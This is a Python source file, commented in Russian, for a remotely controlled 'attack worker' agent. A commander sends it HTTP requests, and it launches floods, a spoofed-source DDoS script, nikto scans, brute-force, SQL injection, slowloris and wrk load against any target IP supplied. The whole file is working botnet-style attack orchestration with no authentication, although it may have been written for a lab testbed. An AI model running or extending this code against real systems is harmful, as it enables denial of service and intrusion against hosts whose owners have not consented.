"""
WORKER AGENT — пассивный агент на atk-2…atk-7.
Просто запускается — никакого COMMANDER_IP не нужно.
Командер сам добавляет этот узел через веб-интерфейс и толкает команды.

API:
  GET  /status   — текущий статус воркера
  POST /run      — запустить атаку  {"attack_type": "flood", "target": "1.2.3.4"}
  POST /stop     — остановить атаку
"""

import os
import sys
import time
import socket
import subprocess
import threading
import logging
from fastapi import FastAPI
import uvicorn

logging.basicConfig(level=logging.INFO, format="%(asctime)s [worker] %(message)s")
logger = logging.getLogger("worker")

PORT     = int(os.getenv("WORKER_PORT", 5001))

_HERE = os.path.dirname(os.path.abspath(__file__))
A = lambda name: os.path.join(_HERE, "attacks", name)
app      = FastAPI(title="Attack Worker")

current_proc   = None
current_attack = None
current_target = None
lock           = threading.Lock()
started_at     = time.time()

# Статистика текущей атаки
_atk_started: float | None = None

# Ожидаемый RPS для каждого типа атаки (для оценки requests_sent)
EXPECTED_RPS = {
    "flood":     300,
    "ddos":      80,
    "scan":      5,
    "brute":     20,
    "sqli":      10,
    "slowloris": 2,
    "slow":      40,
}


ATTACKS = {
    "flood":     lambda t: ["ab", "-n", "500000", "-c", "200", "-q", f"http://{t}/"],
    "ddos":      lambda t: [sys.executable, A("ddos_spoof.py"), t],
    "scan":      lambda t: ["nikto", "-h", f"http://{t}", "-maxtime", "90s", "-quiet"],
    "brute":     lambda t: [sys.executable, A("brute.py"), t],
    "sqli":      lambda t: [sys.executable, A("sqli.py"), t],
    "slowloris": lambda t: [sys.executable, A("slowloris.py"), t],
    "slow":      lambda t: ["wrk", "-t2", "-c15", "-d60s", f"http://{t}/search"],
}


def _run(attack_type: str, target: str):
    global current_proc, current_attack, current_target, _atk_started
    with lock:
        if current_proc and current_proc.poll() is None:
            current_proc.terminate()
            current_proc.wait()
        cmd = ATTACKS.get(attack_type, ATTACKS["flood"])(target)
        logger.info(f"Запускаю {attack_type} → {target}")
        try:
            current_proc   = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            current_attack = attack_type
            current_target = target
            _atk_started   = time.time()
        except FileNotFoundError as e:
            logger.error(f"Инструмент не найден: {e}")
            current_proc = None


def _stop():
    global current_proc, current_attack, current_target, _atk_started
    with lock:
        if current_proc and current_proc.poll() is None:
            current_proc.terminate()
            current_proc.wait()
        current_proc   = None
        current_attack = None
        current_target = None
        _atk_started   = None


@app.get("/status")
def status():
    alive = current_proc is not None and current_proc.poll() is None
    return {
        "host":           socket.gethostname(),
        "ip":             socket.gethostbyname(socket.gethostname()),
        "status":         "attacking" if alive else "idle",
        "current_attack": current_attack if alive else None,
        "target":         current_target if alive else None,
        "uptime":         int(time.time() - started_at),
    }


@app.get("/stats")
def stats():
    """Расширенная статистика текущей атаки."""
    alive = current_proc is not None and current_proc.poll() is None
    elapsed = round(time.time() - _atk_started, 1) if _atk_started else 0
    exp_rps = EXPECTED_RPS.get(current_attack, 10) if alive else 0
    est_req = int(elapsed * exp_rps) if alive else 0
    return {
        "host":            socket.gethostname(),
        "ip":              socket.gethostbyname(socket.gethostname()),
        "status":          "attacking" if alive else "idle",
        "attack_type":     current_attack,
        "target":          current_target,
        "elapsed_sec":     elapsed,
        "estimated_rps":   exp_rps if alive else 0,
        "estimated_reqs":  est_req,
    }


@app.post("/run")
def run(body: dict):
    attack_type = body.get("attack_type", "flood")
    target      = body.get("target", "")
    if not target:
        return {"error": "target required"}
    threading.Thread(target=_run, args=(attack_type, target), daemon=True).start()
    return {"status": "started", "attack": attack_type, "target": target}


@app.post("/stop")
def stop():
    _stop()
    return {"status": "stopped"}


if __name__ == "__main__":
    my_ip = socket.gethostbyname(socket.gethostname())
    logger.info(f"Worker ready — {my_ip}:{PORT}")
    logger.info(f"Добавь этот воркер в командер: POST /workers/add {{\"ip\": \"{my_ip}\"}}")
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="warning")
